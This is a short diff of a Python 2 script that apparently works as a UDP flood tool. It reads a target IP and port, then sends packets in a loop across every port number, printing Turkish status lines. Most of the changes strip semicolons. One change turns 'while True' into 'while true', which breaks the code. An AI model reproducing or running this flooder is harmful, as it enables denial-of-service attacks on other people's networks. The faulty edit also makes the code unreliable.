@@ -28,15 +28,15 @@ ip = raw_input("IP: ");
 port = input("Port: ");
 os.system("clear");
 sent = 0;
-while True:
+while true:
   while 1:
     if time.time() > timeout:
-      break;
+      break
     else:
-      pass;
+      pass
     sock.sendto(bytes, (ip,port))
-    sent = sent + 1;
-    port = port + 1;
+    sent = sent + 1
+    port = port + 1
     print "\033[92m%s. paket, %s adresine; %s portuyla gonderildi"%(sent,ip,port)
     if port == 65534:
-      port = 1;
+      port = 1
